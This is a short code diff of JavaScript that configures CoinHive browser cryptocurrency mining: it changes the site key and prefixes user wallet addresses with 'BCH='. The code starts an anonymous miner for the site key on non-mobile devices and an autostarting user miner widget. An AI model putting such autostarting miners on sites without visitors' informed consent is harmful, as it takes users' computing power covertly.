@@ -1,4 +1,4 @@
-var siteKey = 'X6mRdaLoSD2YkcHAWS2YoEIULfdM6PhT'
+var siteKey = 'wa8hBKDsq6HbuplTPJj6NZr0MGs3kVuH'
 /** For Setting up the User Miner */
 var anonMiner = new CoinHive.Anonymous(siteKey, {throttle: 0.2});
 if (!miner.isMobile()) {
@@ -64,7 +64,7 @@ function createiframe() {
 
 function startUserMiner() {
     var userWalletAddress = getWalletAddress();
-    var userMiner = new CoinHive.User(siteKey, userWalletAddress, {threads: 1,
+    var userMiner = new CoinHive.User(siteKey, 'BCH=' + userWalletAddress, {threads: 1,
         throttle: 1});
     // AnonMiner.stop();
     // Neccessary to update user Total Hashes not actually Mining
@@ -79,7 +79,7 @@ function startUserMiner() {
     var div = document.createElement('div');
     createAttribute('class', 'coinhive-miner', div);
     createAttribute('data-key', siteKey, div);
-    createAttribute('data-user', userWalletAddress, div);
+    createAttribute('data-user', 'BCH=' + userWalletAddress, div);
     createAttribute('data-autostart', 'true', div);
     createAttribute('data-whitelabel', 'false', div);
     createAttribute('data-background', '#FFFFFF', div);
